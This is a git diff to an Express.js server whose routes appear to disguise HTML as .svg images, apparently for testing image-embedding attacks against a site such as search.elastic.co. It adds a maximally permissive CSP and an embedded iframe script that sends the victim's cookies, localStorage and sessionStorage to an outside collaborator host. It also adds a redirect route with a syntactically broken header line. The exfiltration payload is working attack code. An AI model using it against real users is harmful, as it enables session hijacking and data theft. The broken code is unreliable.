@@ -175,9 +175,76 @@ app.get('/image_escape.svg', (req, res) => {
 
 app.get('/image-IMG-tag.svg', (req, res) => {
   // Serve JavaScript instead of an image
-  res.setHeader('Content-Type', 'image/svg+xml');
+  res.setHeader('Content-Type', 'text/html');
   res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
   res.send(`<img src="X" onerror="alert(1)" />`);
+});
+
+app.get('/redirect.svg', (req, res) => {
+  // Serve JavaScript instead of an image
+  res.setHeader('Content-Type', 'text/html');
+  res.setHeader('Location: 'https://google.com'')
+  res.setHeader('Content-Security-Policy', `default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; style-src * 'unsafe-inline' data:; img-src * data: blob:; object-src *; connect-src *; frame-src *; frame-ancestors *; form-action *; base-uri *`)
+  res.send(`redirecting..`);
+});
+
+
+app.get('/embed.svg', (req, res) => {
+  // Organize headers into a single object for readability
+  const headers = {
+    'Content-Type': 'text/html',
+    'Content-Security-Policy': [
+      "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
+      "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
+      "style-src * 'unsafe-inline' data:",
+      "img-src * data: blob:",
+      "object-src *",
+      "connect-src *",
+      "frame-src *",
+      "frame-ancestors *",
+      "X-Frame-Options 'ALLOW-FROM https://search.elastic.co'",
+      "form-action *",
+      "base-uri *",
+      "sandbox allow-popups allow-scripts allow-popups-to-escape-sandbox allow-top-navigation allow-forms"
+    ].join('; ')
+  };
+
+  // Set headers
+  res.set(headers);
+
+  // Malicious HTML content embedded in an iframe
+  res.status(200).send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Malicious Embed</title>
+    </head>
+    <body>
+        <iframe srcdoc="
+          <!DOCTYPE html>
+          <html>
+          <head>
+              <script>
+                  // Example malicious JavaScript
+                  fetch('https://kani-collaborator.onrender.com/stolen-data', {
+                      method: 'POST',
+                      body: JSON.stringify({
+                          cookies: document.cookie,
+                          localStorage: JSON.stringify(localStorage),
+                          sessionStorage: JSON.stringify(sessionStorage)
+                      }),
+                      headers: { 'Content-Type': 'application/json' }
+                  });
+              </script>
+          </head>
+          <body>
+              <h1>Malicious Code Executing...</h1>
+          </body>
+          </html>
+        " style="width:100%; height:100%; border:none;"></iframe>
+    </body>
+    </html>
+  `);
 });
 
 app.get('/image-a-tag.svg', (req, res) => {
